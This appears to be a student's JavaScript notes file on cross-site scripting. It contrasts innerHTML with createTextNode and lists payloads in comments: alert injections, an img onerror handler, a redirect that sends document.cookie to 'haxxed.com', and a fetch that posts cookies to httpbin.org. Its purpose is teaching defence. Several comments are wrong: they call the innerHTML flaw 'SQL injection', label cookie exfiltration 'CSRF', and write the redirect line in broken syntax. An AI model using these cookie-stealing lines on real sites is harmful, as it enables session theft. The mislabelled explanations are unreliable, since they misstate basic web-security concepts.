// try inputting this: <script>alert('hi')</script>
// Now, try inputting this: <img src="/" onerror = "alert(1);">
// Scripts injected into the DOM via script tags in innerHTML
// are not run at the time they are injected (inline scripts
// are run at the time the original page is parsed). On the
// other hand, images injected into the DOM are loaded at that
// time, and if the loading fails, then the onerror event
// handler is called.
const userInputInHTML = (input) => {
  const p = document.getElementById("pleaseNo")
  // Bad --- SQL injection can occur here, as commands can still be injected and not converted to plaintext
  // p.innerHTML = input;

  // Better --- createTextNode() converts the input to pure text, so commands can't be executed
  var textnode = document.createTextNode(input);
  p.appendChild(textnode);
}
const sendToServer = () => {
  const input = document.querySelector('#userinput').value;
  userInputInHTML(input)
  fetch('http://localhost:3000/secret', {
    headers: new Headers({
      'Content-Type': 'application/json'
    }),
    method: 'POST',
    body: JSON.stringify({userInput: input})
  })
}

/* XSSS
   window.location = $`'haxxed.com?cookie='${document.cookie}`
   window.location displays the url of the current site
   document.cookie contains the user input or login details
   Above script sends the user to a different site when injected and sends the data of the cookie to the attacker
   
   document.write('<script>alert("Hello World!")</script>')
   Aslo avoid using document.write(), as it can also execute scripts
*/

// CSRF
// fetch('//httpbin.org/post',{method:'POST',body:document.cookie})
// This script sends cookie data back to url passed in first argument